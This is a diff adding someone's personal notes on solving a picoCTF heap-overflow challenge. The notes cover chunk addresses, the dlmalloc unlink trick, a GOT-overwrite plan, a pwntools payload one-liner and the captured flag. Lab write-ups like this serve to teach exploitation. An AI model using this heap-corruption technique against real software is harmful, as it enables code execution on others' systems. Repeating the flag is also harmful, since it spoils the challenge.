@@ -1,0 +1,54 @@
+Can do heap overflow between heap chunks.
+Will read about dlmalloc.
+
+alloc 666 bytes to fullname
+alloc 66 bytes to name
+alloc 66 bytes to lastname
+
+gets() input to fullname
+gets() input to lastname
+
+free fullname
+free name
+free lastname
+
+No control @ name heap chunk
+
+check the returned values of each malloc 
+
+fullname @ 0x0804e008 - contains the data
+^ 672 v
+name @ 0x0804e2a8 - contains the data 
+^ 72 v
+lastname @ 0x0804e2f0 - data
+
+subtract 0x4 to get the metadata - size + prev in use ( least significant byte )
+
+Can overwrite the metadata of 2nd chunk firstname length - 668 + 4 bytes for name metadata
+
+segfault @ 0x8049bee <free+330>       mov    DWORD PTR [eax+0xc], edx
+eax & edx = 0 when firstname length = 669, since the value of name metadata is still valid
+
+remember: need to call win func - 0x8048936
+
+#define unlink(P, BK, FD) { \
+  FD = P->fd;               \
+  BK = P->bk;               \
+  FD->bk = BK;              \
+  BK->fd = FD;              \
+}
+
+overwrite 0x8048770 <exit@plt> GOT with an address on the heap that contains a shellcode that calls win func
+
+asm('nop; '*10+'push 0x8048936; ret')
+
+overwrite prev size and size of name with -4
+set fd and bk of name 
+fd = exit@got - 12 - 0x804d02c
+bk = fullname + 8 (write shellcode here)
+
+scratch: r <<< $(python -c 'from pwn import *;print "A"*664 + "\xfc\xff\xff\xff" + "\xff"*4 + p32(0x804d020) + p32(0x0804e010)+ p32(0x804d020) + "A"*1000 + "\n" + "B"*10')
+
+flag: picoCTF{a_s1mpl3_h3ap_5e4b54d4}
+
+lol - don't overwrite exit, since it will call the next free, overwrite puts 
